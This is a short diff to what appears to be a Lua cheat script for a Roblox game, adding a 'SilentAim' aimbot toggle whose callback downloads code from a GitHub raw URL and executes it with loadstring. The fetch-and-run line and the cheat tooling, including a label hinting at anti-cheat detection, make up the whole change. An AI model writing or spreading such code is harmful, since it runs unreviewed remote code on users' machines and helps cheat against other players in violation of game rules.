@@ -156,10 +156,10 @@ local Toggle = aimbotTab:CreateToggle({
 })
 
 local Toggle = aimbotTab:CreateToggle({
-   Name = "SilentAim(Rivals)",
+   Name = "SilentAim(Rivals and maybe detected)",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-      
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/idkmanLOL63/idkk/refs/heads/main/sss"))()
    end,
 })
